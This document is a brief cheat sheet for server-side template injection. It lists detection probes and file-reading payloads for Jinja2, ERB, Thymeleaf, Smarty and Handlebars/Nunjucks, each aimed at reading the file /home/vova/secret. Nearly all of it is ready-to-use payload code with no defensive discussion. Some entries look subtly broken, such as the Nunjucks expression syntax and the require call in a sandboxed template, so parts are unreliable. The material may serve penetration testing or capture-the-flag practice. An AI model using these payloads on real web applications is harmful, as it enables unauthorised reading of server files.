# Server-side template injection

Test Queries: Enter the commands that will cause the error and look at the specific messages to determine the ENGINE.

# Exploitation of SSTI to access /home/vova/secret by languages ​​and template systems

## Python (Jinja2)

```
{{ }}, {% %}, {{7*7}} = 49
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/home/vova/secret').read() }}
```

## Ruby (ERB)

```
<%= %>, <%= 7 * 7 %> = 49
<%= File.read('/home/vova/secret') %>
```

## Java (Thymeleaf)

```
th:text, ${}, ${7*7} = 49
${new java.util.Scanner(new java.io.File("/home/vova/secret")).useDelimiter("\\A").next()}
```

## PHP (Smarty)

```
{ },{7*7} = 49
{file_get_contents('/home/vova/secret')}
```

## Node.js (Handlebars, Nunjucks)

```
{{ }}, {{7*7}} = 49 //Handlebars
{% %}, {% 7*7 %} = 49 //Nunjucks

{% set fs = require('fs') %}
{{ fs.readFileSync('/home/vova/secret', 'utf-8') }}
```
